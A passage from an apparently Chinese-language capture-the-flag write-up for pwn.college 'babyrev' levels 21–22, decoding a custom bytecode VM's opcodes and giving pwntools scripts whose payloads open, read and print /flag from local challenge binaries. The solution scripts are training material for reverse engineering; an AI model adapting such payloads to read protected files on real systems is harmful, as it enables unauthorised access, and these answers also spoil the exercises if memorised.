class="hljs-number">0x1e</span>, <span class="hljs-number">0xff</span>-<span class="hljs-number">0xe6</span>, <span class="hljs-number">0x9</span>-<span class="hljs-number">0x88</span>, <span class="hljs-number">0x8e</span>-<span class="hljs-number">0x12</span>, <span class="hljs-number">0x2b</span>-<span class="hljs-number">0xa1</span>, <span class="hljs-number">0x6f</span>-<span class="hljs-number">0xd3</span>, <span class="hljs-number">0x1e</span>-<span class="hljs-number">0xc3</span>, <span class="hljs-number">0xc8</span>-<span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>-<span class="hljs-number">0xb2</span>, <span class="hljs-number">0xe2</span>-<span class="hljs-number">0xdf</span>, <span class="hljs-number">0x53</span>-<span class="hljs-number">0x95</span>, <span class="hljs-number">0x3b</span>-<span class="hljs-number">0xf6</span>, <span class="hljs-number">0x07</span>-<span class="hljs-number">0x98</span>, <span class="hljs-number">0xfd</span>-<span class="hljs-number">0x57</span>, <span class="hljs-number">0x79</span>-<span class="hljs-number">0x66</span>, <span class="hljs-number">0x6e</span>-<span class="hljs-number">0xc</span>, <span class="hljs-number">0x01</span>-<span class="hljs-number">0x77</span>, <span class="hljs-number">0x57</span>-<span class="hljs-number">0xe5</span>, <span class="hljs-number">0xa8</span>-<span class="hljs-number">0x6d</span>, <span class="hljs-number">0x61</span>-<span class="hljs-number">0x42</span>, <span class="hljs-number">0xa8</span>-<span class="hljs-number">0xbf</span>,<span class="hljs-number">0x63</span>- <span class="hljs-number">0x1c</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(al))<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(al)):<br>    <span class="hljs-comment"># print(al[i])</span><br><br>    payload += struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, (al[i]) % <span class="hljs-number">256</span>)<br><span class="hljs-comment"># payload = struct.pack(&#x27;21B&#x27;, *al)</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br>z = p.readline()<br><span class="hljs-keyword">while</span>(z):<br>    <span class="hljs-built_in">print</span>(z)<br>    z = p.readline()<br><br></code></pre></td></tr></table></figure><h4 id="level21-0"><a href="#level21-0" class="headerlink" title="level21.0"></a>level21.0</h4><p>这题需要自己写yancode，可以参考20.0，然后调试它。可以发现yancode是以三个字节三个字节作为一个指令的。也就是一个opcode加两个参数。那么根据不同的opcode和参数做出不同的操作。</p><p>这里需要做的是：将<code>/flag</code>字符串写入内存中，然后调用<code>open</code>，也就是<code>SYS open</code>打开<code>/flag</code>。它会返回一个文件描述符，通常为<code>0x3</code>。然后再调用<code>SYS read</code>，将<code>0x3</code>读入到内存中，它会返回读入的字节数，就是flag的长度为<code>0x39</code>。最后使用<code>SYS write</code>把内存中的flag读出来。exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-21-0&#x27;, &#x27;b interpreter_loop&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-21-0&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>imm_a= <span class="hljs-number">0x403010</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x402f40</span>                                 <span class="hljs-comment"># IMM b = 0x2f     &#x27;/&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x403110</span>                                  <span class="hljs-comment"># IMM a = 0x31</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406640</span>                                 <span class="hljs-comment"># IMM b = 0x66     &#x27;f&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                                     <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x403210</span>                                  <span class="hljs-comment"># IMM a = 0x32</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406c40</span>                                 <span class="hljs-comment"># IMM b = 0x6c     &#x27;l&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>imm_a= <span class="hljs-number">0x403310</span>                                  <span class="hljs-comment"># IMM a = 0x33</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406140</span>                                 <span class="hljs-comment"># IMM b = 0x61     &#x27;a&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]  <br>imm_a= <span class="hljs-number">0x403410</span>                                  <span class="hljs-comment"># IMM a = 0x34</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406740</span>                                 <span class="hljs-comment"># IMM b = 0x67     &#x27;g&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x204010</span>                               <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]      <br>imm_a= <span class="hljs-number">0x403010</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400040</span>                                 <span class="hljs-comment"># IMM b = 0     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_open = <span class="hljs-number">0x081008</span>                             <span class="hljs-comment"># open /flag</span><br>payload += p32(sys_open, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x404040</span>                                 <span class="hljs-comment"># IMM b = 0x40     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_c = <span class="hljs-number">0x40ff08</span>                                <span class="hljs-comment"># IMM c = 0xff</span><br>payload += p32(imm_c, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x080801</span>                              <span class="hljs-comment"># SYS Read</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_a = <span class="hljs-number">0x400110</span>                                <span class="hljs-comment"># IMM a = 0x01</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x404040</span>                                 <span class="hljs-comment"># IMM b = 0x3     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x080820</span>                             <span class="hljs-comment"># SYS write</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>exi = <span class="hljs-number">0x084004</span>                          <span class="hljs-comment"># exit</span><br><span class="hljs-comment"># pause()</span><br>payload += p32(exi, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-built_in">print</span>(p.readline())<br><br>p.close()<br></code></pre></td></tr></table></figure><h4 id="level21-1"><a href="#level21-1" class="headerlink" title="level21.1"></a>level21.1</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">40 </span>imm<br><span class="hljs-symbol">80 </span>add<br><span class="hljs-symbol">02 </span>stk<br><span class="hljs-symbol">04 </span>stm<br><span class="hljs-symbol">01 </span>ldm<br><span class="hljs-symbol">20 </span>cmp<br><span class="hljs-symbol">10 </span>jmp<br><span class="hljs-symbol">8 </span> sys<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">64</span><span class="hljs-selector-tag">a</span><br><span class="hljs-number">8</span><span class="hljs-selector-tag">b</span><br><span class="hljs-number">32</span>c<br><span class="hljs-number">1</span>d<br><span class="hljs-number">16</span>s<br><span class="hljs-number">4</span><span class="hljs-selector-tag">i</span><br><span class="hljs-number">2</span>f<br></code></pre></td></tr></table></figure><p>ida把对应的变量替换。因为每次指令对应的opcode以及变量对应的变量code都会变化。因此这里做一个替换。</p><p>不过替换之后还是有问题，通过gdb调试过程中发现，参数顺序换了。也就是arg1 和 arg2又恢复成正常顺序了，上面那题arg1 和 arg2是反着的。最后exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-21-1&#x27;, &#x27;b interpreter_loop&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-21-1&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>imm_a= <span class="hljs-number">0x404030</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x40082f</span>                                 <span class="hljs-comment"># IMM b = 0x2f     &#x27;/&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x404031</span>                                  <span class="hljs-comment"># IMM a = 0x31</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400866</span>                                 <span class="hljs-comment"># IMM b = 0x66     &#x27;f&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                                     <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x404032</span>                                  <span class="hljs-comment"># IMM a = 0x32</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x40086c</span>                                 <span class="hljs-comment"># IMM b = 0x6c     &#x27;l&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>imm_a= <span class="hljs-number">0x404033</span>                                 <span class="hljs-comment"># IMM a = 0x33</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400861</span>                                 <span class="hljs-comment"># IMM b = 0x61     &#x27;a&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]  <br>imm_a= <span class="hljs-number">0x404034</span>                                  <span class="hljs-comment"># IMM a = 0x34</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400867</span>                                 <span class="hljs-comment"># IMM b = 0x67     &#x27;g&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044008</span>                               <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]      <br>imm_a= <span class="hljs-number">0x404030</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400800</span>                                 <span class="hljs-comment"># IMM b = 0     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_open = <span class="hljs-number">0x082040</span>                             <span class="hljs-comment"># open /flag</span><br>payload += p32(sys_open, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400840</span>                                 <span class="hljs-comment"># IMM b = 0x40     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_c = <span class="hljs-number">0x4020ff</span>                                <span class="hljs-comment"># IMM c = 0xff</span><br>payload += p32(imm_c, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x080420</span>                              <span class="hljs-comment"># SYS Read</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_a = <span class="hljs-number">0x404001</span>                                <span class="hljs-comment"># IMM a = 0x01</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400840</span>                                 <span class="hljs-comment"># IMM b = 0x3     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x081020</span>                             <span class="hljs-comment"># SYS write</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>exi = <span class="hljs-number">0x080108</span>                          <span class="hljs-comment"># exit</span><br><span class="hljs-comment"># pause()</span><br>payload += p32(exi, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-built_in">print</span>(p.readline())<br><br>p.close()<br></code></pre></td></tr></table></figure><h4 id="level22-0"><a href="#level22-0" class="headerlink" title="level22.0"></a>level22.0</h4><p>因为opcode和var_code的总数不是很多，可以记录一下。</p><table><thead><tr><th>opcode</th><th>op</th></tr></thead><tbody><tr><td>0x1</td><td>ADD</td></tr><tr><td>0x2</td><td>IMM</td></tr><tr><td>0x4</td><td>STK</td></tr><tr><td>0x8</td><td>JMP</td></tr><tr><td>0x10</td><td>LDM</td></tr><tr><td>0x20</td><td>SYS</td></tr><tr><td>0x40</td><td>STM</td></tr><tr><td>0x80</td><td>CMP</td></tr><tr><td></td><td></td></tr></tbody></table><p>变量记录如下：</p><table><thead><tr><th>变量</th><th>Code</th></tr></thead><tbody><tr><td>a</td><td>0x04</td></tr><tr><td>b</td><td>0x40</td></tr><tr><td>c</td><td>0x01</td></tr><tr><td>d</td><td>0x10</td></tr><tr><td>s</td><td>0x02</td></tr><tr><td>i</td><td>0x80</td></tr><tr><td>f</td><td>0x08</td></tr></tbody></table><p>并且测试的时候发现，arg1在三字节的第一个位置，arg2在三字节中的第二个位置，opcode在最后。</p><p>关于SYS而言，Sleep是08，write是01，read_code是04，open是20，exit是40，read是80</p><p>针对SYS指令，第一个字节是syscode，第二个位置是变量code，第三个位置是opcode。</p><p>这种情况下，改exp就很快了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-21-1&#x27;, &#x27;b interpreter_loop&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-22-0&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>imm_a= <span class="hljs-number">0x043002</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x402f02</span>                                 <span class="hljs-comment"># IMM b = 0x2f     &#x27;/&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                                <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x043102</span>                                  <span class="hljs-comment"># IMM a = 0x31</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406602</span>                                 <span class="hljs-comment"># IMM b = 0x66     &#x27;f&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                                     <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]   <br>imm_a= <span class="hljs-number">0x043202</span>                                  <span class="hljs-comment"># IMM a = 0x32</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406c02</span>                                 <span class="hljs-comment"># IMM b = 0x6c     &#x27;l&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                                 <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>imm_a= <span class="hljs-number">0x043302</span>                                 <span class="hljs-comment"># IMM a = 0x33</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406102</span>                                 <span class="hljs-comment"># IMM b = 0x61     &#x27;a&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                                 <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]  <br>imm_a= <span class="hljs-number">0x043402</span>                                  <span class="hljs-comment"># IMM a = 0x34</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x406702</span>                                 <span class="hljs-comment"># IMM b = 0x67     &#x27;g&#x27;</span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>stm_a = <span class="hljs-number">0x044040</span>                               <span class="hljs-comment"># STM *a = b</span><br>payload += p32(stm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]      <br>imm_a= <span class="hljs-number">0x043002</span>                                  <span class="hljs-comment"># IMM a = 0x30 </span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x400002</span>                                 <span class="hljs-comment"># IMM b = 0     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_open = <span class="hljs-number">0x200420</span>                             <span class="hljs-comment"># open /flag</span><br>payload += p32(sys_open, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x404002</span>                                 <span class="hljs-comment"># IMM b = 0x40     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_c = <span class="hljs-number">0x01ff02</span>                                <span class="hljs-comment"># IMM c = 0xff</span><br>payload += p32(imm_c, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x800120</span>                              <span class="hljs-comment"># SYS Read</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_a = <span class="hljs-number">0x040102</span>                                <span class="hljs-comment"># IMM a = 0x01</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_b = <span class="hljs-number">0x404002</span>                                 <span class="hljs-comment"># IMM b = 0x40     </span><br>payload += p32(imm_b, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x010420</span>                             <span class="hljs-comment"># SYS write</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]     <br>exi = <span class="hljs-number">0x0400420</span>                          <span class="hljs-comment"># exit</span><br><span class="hljs-comment"># pause()</span><br>payload += p32(exi, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>    <span class="hljs-built_in">print</span>(p.readline())<br><br>p.close()<br></code></pre></td></tr></table></figure><h4 id="level22-1"><a href="#level22-1" class="headerlink" title="level22.1"></a>level22.1</h4><p>根据discord以及一些别人的wp，发现得查看Crash信息，才能知道。跑一下爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 